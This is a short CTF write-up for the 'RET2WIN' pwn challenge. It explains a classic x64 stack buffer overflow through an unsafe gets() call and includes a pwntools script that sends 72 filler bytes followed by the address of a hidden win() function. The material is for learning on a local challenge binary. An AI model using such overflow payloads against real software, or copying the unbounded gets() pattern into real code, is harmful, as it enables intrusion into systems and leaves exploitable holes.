---
layout: page
title: "RET2WIN - Google CTF 2025 Writeup"
subtitle: "Basic x64 stack buffer overflow. Overwrite the saved return address (RIP) on the stack to jump to a hidden `win()` function that prints the flag."
permalink: /ctf/writeups/challenges/pwn/ret2win/
category: "pwn"
challenge_name: "RET2WIN"
difficulty: "Easy"
event: "Google CTF 2025"
points: "120"
solves: "654"
date: 2026-06-26
---

## 🚩 Challenge Overview
* **Platform/Event**: Google CTF 2025
* **Difficulty**: Easy
* **Points**: 120
* **Solves**: 654
* **Category**: Pwn
* **Tags**: Stack Overflow, Buffer Overflow, x84_64, ret2win

---

## 📝 Description
Basic x64 stack buffer overflow. Overwrite the saved return address (RIP) on the stack to jump to a hidden `win()` function that prints the flag.

---

## 💡 Solution / Approach
1. Analyze binary in GHIDRA: Locate target function `win()` at address `0x00401156`.

2. Find buffer size: The vulnerable `gets(buffer)` fills a 64-byte array. The offset to the saved RIP is 72 bytes (64 bytes buffer + 8 bytes saved RBP).

3. Build python exploit using pwntools:

```python
from pwn import *

target = process('./ret2win')
win_addr = 0x00401156

payload = b"A" * 72 + p64(win_addr)
target.sendline(payload)
target.interactive()
```
